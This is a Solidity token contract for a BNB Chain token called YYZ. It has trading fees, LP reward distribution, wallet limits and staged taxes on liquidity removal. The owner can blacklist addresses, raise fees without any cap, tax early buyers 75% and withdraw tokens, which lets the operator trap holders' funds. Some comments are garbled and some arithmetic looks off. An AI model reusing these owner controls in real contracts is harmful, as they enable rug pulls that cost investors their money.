/**
 *Submitted for verification at BscScan.com on 2023-03-25
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.14;

interface IERC20 {
    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface ISwapRouter {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
}

interface ISwapFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

abstract contract Ownable {
    address internal _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "!owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "new is 0");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface ISwapPair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function token0() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function totalSupply() external view returns (uint256);
}


contract TokenDistributor {
    constructor (address token) {
        IERC20(token).approve(msg.sender, uint(~uint256(0)));
    }
}

abstract contract AbsToken is IERC20, Ownable {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    address public fundAddress;
    address public teamAddress = address(0x0e800cD11ceB7d737C060A69B68B8eBc992DcC97);  
    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint256 public maxBuyAmount;


    mapping(address => bool) public _feeWhiteList;
    mapping(address => bool) public _blackList;
    mapping (address => bool) public isWalletLimitExempt;

    uint256 private _tTotal;

    ISwapRouter public _swapRouter;
    address public _fist;
    mapping(address => bool) public _swapPairList;

    bool private inSwap;

    uint256 private constant MAX = ~uint256(0);
    TokenDistributor public _tokenDistributor;

    uint256 public _buyFundFee = 250; 
    uint256 public _buyLPDividendFee = 0; 
    uint256 public _sellLPDividendFee = 200; 
    uint256 public _sellFundFee = 250;
    uint256 public _sellLPFee = 200;
    bool public limitEnable = true;

    uint256 public kb = 2 ;
    uint256 public walletLimit;


    uint256 public startTradeBlock;
    uint256 public _startTradeTime;

    address public _mainPair;

    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor (
        address RouterAddress, address FISTAddress,
        string memory Name, string memory Symbol, uint8 Decimals, uint256 Supply,
        address FundAddress, address ReceiveAddress
    ){
        _name = Name;
        _symbol = Symbol;
        _decimals = Decimals;

        ISwapRouter swapRouter = ISwapRouter(RouterAddress);
        IERC20(FISTAddress).approve(address(swapRouter), MAX);

        _fist = FISTAddress;
        _swapRouter = swapRouter;
        _allowances[address(this)][address(swapRouter)] = MAX;

        ISwapFactory swapFactory = ISwapFactory(swapRouter.factory());
        address swapPair = swapFactory.createPair(address(this), FISTAddress);
        _mainPair = swapPair;
        _swapPairList[swapPair] = true;

        uint256 total = Supply * 10 ** Decimals;
        _tTotal = total;

        _balances[ReceiveAddress] = total;
        emit Transfer(address(0), ReceiveAddress, total);

        fundAddress = FundAddress;

        maxBuyAmount = 100000000 * 10** Decimals;
        walletLimit =  100000000 * 10** Decimals; 

        _feeWhiteList[FundAddress] = true;
        _feeWhiteList[teamAddress] = true;
        _feeWhiteList[ReceiveAddress] = true;
        _feeWhiteList[address(this)] = true;
        _feeWhiteList[address(swapRouter)] = true;
        _feeWhiteList[msg.sender] = true;

        isWalletLimitExempt[msg.sender] = true;
        isWalletLimitExempt[fundAddress] = true;
        isWalletLimitExempt[ReceiveAddress] = true;
        isWalletLimitExempt[address(swapRouter)] = true;
        isWalletLimitExempt[address(_mainPair)] = true;
        isWalletLimitExempt[address(this)] = true;
        isWalletLimitExempt[address(0xdead)] = true;

        excludeHolder[address(0)] = true;
        excludeHolder[address(0x000000000000000000000000000000000000dEaD)] = true;

        holderRewardCondition = 5 * 10 ** IERC20(FISTAddress).decimals();

        _tokenDistributor = new TokenDistributor(FISTAddress);
    }

    function symbol() external view override returns (string memory) {
        return _symbol;
    }

    function name() external view override returns (string memory) {
        return _name;
    }

    function decimals() external view override returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        if (_allowances[sender][msg.sender] != MAX) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;
        }
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function setMaxAmount(uint256 _maxBuyAmount) public onlyOwner{
        maxBuyAmount = _maxBuyAmount;
    }

    function setWalletLimit(uint256 _walletLimit) public onlyOwner{
        walletLimit = _walletLimit;
    }

        function _isAddLiquidity() internal view returns (bool isAdd){
        ISwapPair mainPair = ISwapPair(_mainPair);
        (uint r0,uint256 r1,) = mainPair.getReserves();

        address tokenOther = _fist;
        uint256 r;
        if (tokenOther < address(this)) {
            r = r0;
        } else {
            r = r1;
        }

        uint bal = IERC20(tokenOther).balanceOf(address(mainPair));
        isAdd = bal > r;
    }

    function _isRemoveLiquidity() internal view returns (bool isRemove){
        ISwapPair mainPair = ISwapPair(_mainPair);
        (uint r0,uint256 r1,) = mainPair.getReserves();

        address tokenOther = _fist;
        uint256 r;
        if (tokenOther < address(this)) {
            r = r0;
        } else {
            r = r1;
        }
        uint bal = IERC20(tokenOther).balanceOf(address(mainPair));
        isRemove = r >= bal;
    }


    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(!_blackList[from], "blackList");

        uint256 balance = balanceOf(from);
        require(balance >= amount, "balanceNotEnough");

        if (!_feeWhiteList[from] && !_feeWhiteList[to]) {
            uint256 maxSellAmount = balance * 999999 / 1000000;
            if (amount > maxSellAmount) {
                amount = maxSellAmount;
            }
        }

        bool takeFee;
        bool isRemove;
        bool isAdd;

        if (_swapPairList[from] || _swapPairList[to]) {
            if (!_feeWhiteList[from] && !_feeWhiteList[to]) {

                if (_swapPairList[to]) {
                    isAdd = _isAddLiquidity();
                    takeFee = false;    //LP 0˰
                }else {
                    isRemove = _isRemoveLiquidity();

                }

                if (0 == startTradeBlock) {
                    require(0 < startAddLPBlock && isAdd, "!Trade");
                }
                if (block.number < startTradeBlock + kb) {
                    _funTransfer(from, to, amount);
                    return;
                }

                if (_swapPairList[to]) {
                    if (!inSwap) {
                        uint256 contractTokenBalance = balanceOf(address(this));
                        if (contractTokenBalance > 0) {
                            uint256 swapFee = _buyFundFee + _buyLPDividendFee + _sellFundFee + _sellLPDividendFee + _sellLPFee;
                            uint256 numTokensSellToFund = amount * swapFee / 5000;
                            if (numTokensSellToFund > contractTokenBalance) {
                                numTokensSellToFund = contractTokenBalance;
                            }
                            swapTokenForFund(numTokensSellToFund, swapFee);
                        }
                    }
                }
                takeFee = true;
            }
        }

        _tokenTransfer(from, to, amount, takeFee, isRemove);

        if (from != address(this)) {
            if (_swapPairList[to]) {
                addHolder(from);
            }
            processReward(500000);
        }
    }

    function _funTransfer(
        address sender,
        address recipient,
        uint256 tAmount
    ) private {
        _balances[sender] = _balances[sender] - tAmount;
        uint256 feeAmount = tAmount * 75 / 100;
        _takeTransfer(
            sender,
            fundAddress,
            feeAmount
        );
        _takeTransfer(sender, recipient, tAmount - feeAmount);
    }

    function setisWalletLimitExempt(address holder, bool exempt) external onlyOwner {
        isWalletLimitExempt[holder] = exempt;
    }

    function setLimitEnable(bool status) public onlyOwner {
        limitEnable = status;
    }

    function _tokenTransfer(
        address sender,
        address recipient,
        uint256 tAmount,
        bool takeFee,
        bool isRemove

    ) private {
        _balances[sender] = _balances[sender] - tAmount;
        uint256 feeAmount;

        if (takeFee) {
            uint256 swapFee;

                if (isRemove) {
                
                if (block.timestamp <=  _startTradeTime + 86400) {//��һ��
                    uint removeFeeAmount = tAmount * 5000 / 10000;
                    if (removeFeeAmount > 0) {
                        feeAmount += removeFeeAmount;
                        _takeTransfer(sender, address(0x000000000000000000000000000000000000dEaD), removeFeeAmount);
                    }
                }
                else if(block.timestamp >_startTradeTime + 86400  && block.timestamp <= _startTradeTime + 172800) {//�ڶ���
                    uint removeFeeAmount = tAmount * 4000 / 10000;
                    if (removeFeeAmount > 0) {
                        feeAmount += removeFeeAmount;
                        _takeTransfer(sender, address(0x000000000000000000000000000000000000dEaD), removeFeeAmount);
                    }
                }  
                else if(block.timestamp >_startTradeTime + 172800 && block.timestamp <= _startTradeTime + 259200) {//������
                    uint removeFeeAmount = tAmount * 3000 / 10000;
                    if (removeFeeAmount > 0) {
                        feeAmount += removeFeeAmount;
                        _takeTransfer(sender, address(0x000000000000000000000000000000000000dEaD), removeFeeAmount);
                    }
                }
                else if(block.timestamp >_startTradeTime + 259200 && block.timestamp <= _startTradeTime + 355600) {//������
                    uint removeFeeAmount = tAmount * 2000 / 10000;
                    if (removeFeeAmount > 0) {
                        feeAmount += removeFeeAmount;
                        _takeTransfer(sender, address(0x000000000000000000000000000000000000dEaD), removeFeeAmount);
                    }
                }
                else if(block.timestamp >_startTradeTime + 355600 && block.timestamp <= _startTradeTime + 432000) {//������
                    uint removeFeeAmount = tAmount * 1000 / 10000;
                    if (removeFeeAmount > 0) {
                        feeAmount += removeFeeAmount;
                        _takeTransfer(sender, address(0x000000000000000000000000000000000000dEaD), removeFeeAmount);
                    }
                }
                else{//�����Ժ�
                    uint removeFeeAmount = tAmount * 450 / 10000;
                    if (removeFeeAmount > 0) {
                        feeAmount += removeFeeAmount;
                        _takeTransfer(sender, address(this), removeFeeAmount);
                    }
                }
            }
             else if (_swapPairList[recipient]) {
                swapFee = _sellFundFee + _sellLPDividendFee + _sellLPFee;
            } else {
                swapFee = _buyFundFee + _buyLPDividendFee;
                require(tAmount <= maxBuyAmount,"over max buy amount");
            }
            uint256 swapAmount = tAmount * swapFee / 10000;
            if (swapAmount > 0) {
                feeAmount += swapAmount;
                _takeTransfer(
                    sender,
                    address(this),
                    swapAmount
                );
            }
        }

        if(!isWalletLimitExempt[recipient] && limitEnable)
            require((balanceOf(recipient) + tAmount - feeAmount) <= walletLimit,"over max wallet limit");

        _takeTransfer(sender, recipient, tAmount - feeAmount);
    }

    function swapTokenForFund(uint256 tokenAmount, uint256 swapFee) private lockTheSwap {
        swapFee += swapFee;
        uint256 lpFee = _sellLPFee;
        uint256 lpAmount = tokenAmount * lpFee / swapFee;

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _fist;
        _swapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenAmount - lpAmount,
            0,
            path,
            address(_tokenDistributor),
            block.timestamp
        );

        swapFee -= lpFee;

        IERC20 FIST = IERC20(_fist);
        uint256 fistBalance = FIST.balanceOf(address(_tokenDistributor));
        uint256 fundAmount = fistBalance * (_buyFundFee + _sellFundFee) * 2 / swapFee;
        FIST.transferFrom(address(_tokenDistributor), fundAddress, fundAmount * 3 / 5 );
        FIST.transferFrom(address(_tokenDistributor), teamAddress, fundAmount * 2 / 5 );
        FIST.transferFrom(address(_tokenDistributor), address(this), fistBalance - fundAmount);

        if (lpAmount > 0) {
            uint256 lpFist = fistBalance * lpFee / swapFee;
            if (lpFist > 0) {
                _swapRouter.addLiquidity(
                    address(this), _fist, lpAmount, lpFist, 0, 0, fundAddress, block.timestamp
                );
            }
        }
    }

    function _takeTransfer(
        address sender,
        address to,
        uint256 tAmount
    ) private {
        _balances[to] = _balances[to] + tAmount;
        emit Transfer(sender, to, tAmount);
    }

    function setFundAddress(address addr) external onlyFunder {
        fundAddress = addr;
        _feeWhiteList[addr] = true;
    }

    function setTeamAddress(address addr) external onlyFunder {
        teamAddress = addr;
        _feeWhiteList[addr] = true;
    }

    function setBuyLPDividendFee(uint256 dividendFee) external onlyOwner {
        _buyLPDividendFee = dividendFee;
    }

    function setBuyFundFee(uint256 fundFee) external onlyOwner {
        _buyFundFee = fundFee;
    }

    function setSellLPDividendFee(uint256 dividendFee) external onlyOwner {
        _sellLPDividendFee = dividendFee;
    }

    function setSellFundFee(uint256 fundFee) external onlyOwner {
        _sellFundFee = fundFee;
    }

    function setSellLPFee(uint256 lpFee) external onlyOwner {
        _sellLPFee = lpFee;
    }

    function setkb(uint256 value) public onlyOwner {
        kb = value;
    }

    uint256 public startAddLPBlock;

    function startAddLP() external onlyOwner {
        require(0 == startAddLPBlock, "startedAddLP");
        startAddLPBlock = block.number;
    }

    function closeAddLP() external onlyOwner {
        startAddLPBlock = 0;
    }

    function startTrade() external onlyOwner {
        require(0 == startTradeBlock, "trading");
        startTradeBlock = block.number;
        _startTradeTime = block.timestamp;
    }

    function closeTrade() external onlyOwner {
        startTradeBlock = 0;
    }

    function setFeeWhiteList(address addr, bool enable) external onlyFunder {
        _feeWhiteList[addr] = enable;
    }

    function setBlackList(address addr, bool enable) external onlyOwner {
        _blackList[addr] = enable;
    }

    function multiBlackList(address[] calldata addresses, bool status) public onlyOwner {
        require(addresses.length < 201);
        for (uint256 i; i < addresses.length; ++i) {
            _blackList[addresses[i]] = status;
        }
    }

    function setSwapPairList(address addr, bool enable) external onlyFunder {
        _swapPairList[addr] = enable;
    }

    function claimBalance() external {
        payable(fundAddress).transfer(address(this).balance);
    }

    function claimToken(address token, uint256 amount, address to) external onlyFunder {
        IERC20(token).transfer(to, amount);
    }

    modifier onlyFunder() {
        require(_owner == msg.sender || fundAddress == msg.sender, "!Funder");
        _;
    }

    receive() external payable {}

    address[] private holders;
    mapping(address => uint256) holderIndex;
    mapping(address => bool) excludeHolder;

    function addHolder(address adr) private {
        uint256 size;
        assembly {size := extcodesize(adr)}
        if (size > 0) {
            return;
        }
        if (0 == holderIndex[adr]) {
            if (0 == holders.length || holders[0] != adr) {
                holderIndex[adr] = holders.length;
                holders.push(adr);
            }
        }
    }

    uint256 private currentIndex;
    uint256 private holderRewardCondition;
    uint256 private progressRewardBlock;

    function processReward(uint256 gas) private {
        if (progressRewardBlock + 20 > block.number) {
            return;
        }

        IERC20 FIST = IERC20(_fist);

        uint256 balance = FIST.balanceOf(address(this));
        if (balance < holderRewardCondition) {
            return;
        }

        IERC20 holdToken = IERC20(_mainPair);
        uint holdTokenTotal = holdToken.totalSupply();

        address shareHolder;
        uint256 tokenBalance;
        uint256 amount;

        uint256 shareholderCount = holders.length;

        uint256 gasUsed = 0;
        uint256 iterations = 0;
        uint256 gasLeft = gasleft();

        while (gasUsed < gas && iterations < shareholderCount) {
            if (currentIndex >= shareholderCount) {
                currentIndex = 0;
            }
            shareHolder = holders[currentIndex];
            tokenBalance = holdToken.balanceOf(shareHolder);
            if (tokenBalance > 0 && !excludeHolder[shareHolder]) {
                amount = balance * tokenBalance / holdTokenTotal;
                if (amount > 0) {
                    FIST.transfer(shareHolder, amount);
                }
            }

            gasUsed = gasUsed + (gasLeft - gasleft());
            gasLeft = gasleft();
            currentIndex++;
            iterations++;
        }

        progressRewardBlock = block.number;
    }

    function setHolderRewardCondition(uint256 amount) external onlyFunder {
        holderRewardCondition = amount;
    }

    function setExcludeHolder(address addr, bool enable) external onlyFunder {
        excludeHolder[addr] = enable;
    }
}

contract YYZ is AbsToken {
    constructor() AbsToken(
        address(0x10ED43C718714eb63d5aA57B78B54704E256024E),//RouterAddress
        address(0x55d398326f99059fF775485246999027B3197955),//USDT 
        "YYZ",//Name
        "YYZ",//Symbol
        18,//Decimals
        100000000,//Supply
        address(0x0A9E08F2F6DEE63b33BC88367e79f7Cee54C1448),//FundAddress  
        address(0xc637a21255005Eb0439f7698645D29aBee946FE0)//ReceiveAddress 
    ){

    }
}